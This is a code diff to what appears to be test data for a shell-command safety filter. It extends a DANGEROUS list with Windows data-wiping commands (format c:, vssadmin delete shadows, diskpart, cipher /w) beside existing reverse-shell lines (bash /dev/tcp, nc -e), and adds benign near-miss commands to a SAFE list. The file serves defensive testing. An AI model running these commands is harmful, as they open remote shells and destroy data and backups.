@@ -35,6 +35,17 @@ DANGEROUS = [
     "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
     "nc -e /bin/sh 10.0.0.1 4444",
     "chmod -R 777 /",
+    # Windows equivalents (reachable via `cmd /c` / `powershell -c`)
+    "cmd /c rd /s /q C:\\data",
+    "rmdir /s /q build",
+    "del /s /q *.log",
+    "format c:",
+    "powershell -c Remove-Item -Recurse -Force C:\\ws",
+    "reg delete HKLM\\Software\\Foo /f",
+    "vssadmin delete shadows /all",
+    "diskpart /s wipe.txt",
+    "cipher /w:C",
+    "bcdedit /set {default} safeboot minimal",
 ]
 
 SAFE = [
@@ -48,6 +59,12 @@ SAFE = [
     "mkdir -p checkpoints",
     "echo 'Test accuracy: 0.98'",
     "grep -r pattern src/",
+    # near-misses of the Windows deny patterns
+    "rmdir build",                          # non-recursive
+    "python del_helper.py",                 # 'del' inside an identifier
+    "python format_data.py --csv",          # 'format' without a drive letter
+    "echo deleted 5 rows",
+    "git log --format=oneline",
 ]
 
 
